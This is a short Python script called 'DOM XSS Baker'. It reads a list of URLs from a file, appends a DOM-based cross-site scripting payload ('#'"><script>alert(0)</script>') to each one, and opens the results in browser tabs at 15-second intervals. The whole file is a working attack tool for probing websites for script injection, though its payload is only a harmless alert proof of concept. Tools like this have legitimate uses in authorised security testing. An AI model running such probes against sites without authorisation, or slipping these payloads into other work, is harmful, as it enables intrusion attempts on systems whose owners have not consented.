import webbrowser
import time
import sys

filepath = 'in.txt'
interval = 15

print('Starting DOM XSS Baker......')

raw_links = []

with open(filepath) as fp:
    line = fp.readline()
    while line:
        raw_links.append(line.strip())
        line = fp.readline()

uniq_links = list(set(raw_links))

for each_link in uniq_links:
    print('adding dom xss payload to ' + each_link.strip() + "\r\n")
    baked_url = each_link.strip() + "#'\"><script>alert(0)</script>"
    print("{}\r\n".format(baked_url))
    webbrowser.open_new_tab(baked_url)
    time.sleep(interval)


